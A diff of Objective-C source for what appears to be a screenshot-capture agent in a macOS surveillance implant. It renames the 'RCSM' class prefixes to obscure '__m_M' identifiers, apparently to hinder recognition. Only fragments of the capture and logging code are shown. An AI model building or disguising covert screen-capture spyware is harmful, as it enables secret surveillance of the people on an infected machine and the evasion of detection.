@@ -16,17 +16,17 @@
 #import "RCSMDebug.h"
 
 
-static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
+static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
 
 // See SonOfGrab! http://developer.apple.com/samplecode/SonOfGrab/listing3.html
 
-@interface RCSMAgentScreenshot (hidden)
+@interface __m_MAgentScreenshot (hidden)
 
 - (BOOL)_grabScreenshot: (BOOL)entireDesktop;
 
 @end
 
-@implementation RCSMAgentScreenshot (hidden)
+@implementation __m_MAgentScreenshot (hidden)
 
 - (BOOL)_grabScreenshot: (BOOL)entireDesktop
 {
@@ -130,7 +130,7 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
 #ifdef DEBUG_SCREENSHOT
   verboseLog(@"additionalHeader: %@", rawAdditionalHeader);
 #endif
-  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
+  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
   
   BOOL success = [logManager createLog: AGENT_SCREENSHOT
                            agentHeader: rawAdditionalHeader
@@ -166,13 +166,13 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
 
 @end
 
-@implementation RCSMAgentScreenshot
+@implementation __m_MAgentScreenshot
 
 #pragma mark -
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSMAgentScreenshot *)sharedInstance
++ (__m_MAgentScreenshot *)sharedInstance
 {
   @synchronized(self)
   {
